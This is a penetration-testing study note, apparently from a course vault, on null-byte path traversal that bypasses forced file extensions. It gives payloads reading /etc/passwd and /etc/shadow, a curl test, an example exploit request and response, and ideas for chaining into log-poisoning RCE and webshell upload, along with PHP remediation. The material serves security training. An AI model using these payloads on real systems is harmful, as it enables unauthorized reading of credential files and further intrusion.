---
tags: [vapt, path-traversal, intermediate, bypass]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.04 Null Byte Path Traversal"
portswigger_labs: ["File path traversal, validation of file extension with null byte bypass"]
---

# 23.04 — Null Byte Path Traversal

## What is it?
In many older web applications (especially those running on PHP < 5.3.4, Perl, or Ruby C-extensions), high-level application code interacts with low-level C libraries to interact with the filesystem. In C, a string is "null-terminated," meaning the string ends exactly where the first Null Byte (`\x00` or `%00`) appears.

If an application enforces a rule that a file *must* end with a specific extension (e.g., `.png`), an attacker can append a Null Byte followed by the required extension (e.g., `../../../etc/passwd%00.png`). 

The high-level web application checks the end of the string, sees `.png`, and allows the request. However, when the string is passed to the underlying C-based filesystem API, the API stops reading the string at the Null Byte. It completely ignores `.png` and reads `../../../etc/passwd` instead.

Think of it like a bouncer checking your ID. You show an ID that says "John Doe | OF LEGAL DRINKING AGE". The bouncer reads the whole string and lets you in. But when you go to the bartender, they only read up to the vertical pipe. They just see "John Doe" and serve you based on that name.

## ASCII Diagram
```text
[Attacker Payload] ──>  ../../../etc/passwd%00.png
       │
[Web Application Validator (High-Level)]
       │
       ├─ Reads string: "../../../etc/passwd\x00.png"
       ├─ Does it end with ".png"? YES! -> Passes Validation
       │
[File System API (Low-Level C Function)]
       │
       ├─ Reads string: "../../../etc/passwd\x00.png"
       ├─ Encounters \x00 (Null Byte) -> STOPS READING
       ├─ Truncated Path: "../../../etc/passwd"
       │
[Operating System] ──> Returns contents of /etc/passwd!
```

## How to Find It
- **Manual steps:**
  1. Identify an endpoint that fetches files but forces a specific extension (e.g., `GET /image?file=cat` automatically fetches `cat.png`).
  2. If you try `GET /image?file=../../../etc/passwd`, the server appends `.png` and looks for `/etc/passwd.png` (which doesn't exist, returning a 404).
  3. Inject the null byte: `GET /image?file=../../../etc/passwd%00`.
  4. The server validates/appends the extension resulting in `../../../etc/passwd%00.png`.
  5. If the server is vulnerable, the C-library truncates the `.png` and successfully returns the contents of `/etc/passwd`.

- **Tool commands with flags explained:**
  Using `curl` to test Null Byte injection:
  ```bash
  # Send the URL-encoded null byte (%00)
  curl -s "https://target.com/view.php?page=../../../../etc/passwd%00"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Find a file inclusion or reading parameter that forcibly appends an extension (e.g., `include($_GET['page'] . '.php');`).
  2. Ascertain the required trailing string (e.g., `.php`, `.jpg`).
  3. Construct your traversal payload targeting a known file (e.g., `/etc/passwd` or `C:\Windows\win.ini`).
  4. Terminate your intended path with `%00`.
  5. Send the request. If the backend is running a vulnerable version of PHP or a vulnerable native extension, it will drop the forced extension and execute the traversal.

- **Actual payloads:**
  **Bypassing Forced `.php` Extension:**
  ```text
  ../../../../../../etc/passwd%00
  ```
  **Bypassing Explicit "Must End With" Validation:**
  ```text
  ../../../../../../etc/passwd%00.jpg
  ../../../../../../etc/passwd%00.pdf
  ```
  **Chained with Encoding Bypass (if `../` is blocked):**
  ```text
  ....//....//....//etc/passwd%00.png
  %252e%252e%252f%252e%252e%252fetc/passwd%00.jpg
  ```

- **Real HTTP request/response examples:**
  **Exploit Request:**
  ```http
  GET /download.php?doc=../../../../etc/shadow%00.pdf HTTP/1.1
  Host: target.com
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/pdf
  
  root:$6$xyz123...:18770:0:99999:7:::
  ```
  *(Note how the server still returns the `application/pdf` content type because the high-level application thinks it's serving a PDF, but the actual body is the shadow file!)*

## Real-World Example
In older versions of PHP (prior to 5.3.4), the `include()` and `require()` functions were vulnerable to null byte injection. A common paradigm was `include($_GET['language'] . '.php');`. If a user selected `english`, the server loaded `english.php`. An attacker would send `?language=../../../../etc/passwd%00`. The PHP engine evaluated the string as `../../../../etc/passwd\x00.php`, but when it passed the string to the OS to open the file, the OS stopped at the null byte and included `/etc/passwd` directly into the web page. This affected millions of websites until the PHP core was patched.

## How to Fix It
- **Developer remediation:**
  The primary fix for Null Byte Injection is simply updating your language runtime (e.g., upgrade to PHP > 5.3.4). Modern frameworks natively prevent null bytes from truncating paths. If you are stuck on a legacy system, you must actively strip null bytes from all user input before passing it to any file system functions.

- **Code snippet:**
  **Legacy PHP (Manual Sanitization):**
  ```php
  $user_input = $_GET['file'];
  
  // Explicitly remove null bytes from the input string
  $clean_input = str_replace(chr(0), '', $user_input);
  
  // OR explicitly reject the request
  if (strpos($user_input, "\0") !== false) {
      die("Null byte detected. Request blocked.");
  }
  
  // Proceed with safe path resolution...
  ```

## Chaining Opportunities
- This vuln + [[23.05 Local File Inclusion (LFI)]] → Use the null byte to bypass a forced `.php` extension in an `include()` statement. Instead of just reading `/etc/passwd`, include `/var/log/apache2/access.log` to achieve Remote Code Execution (Log Poisoning).
- This vuln + [[22.06 Null Byte Injection (file.php%00.jpg)]] → The exact same underlying C-string vulnerability applies to File Uploads, allowing attackers to upload webshells that bypass extension allowlists.

## Related Notes
- [[23.02 Basic Path Traversal (../../../etc/passwd)]]
- [[23.05 Local File Inclusion (LFI)]]
- [[22.06 Null Byte Injection (file.php%00.jpg)]]
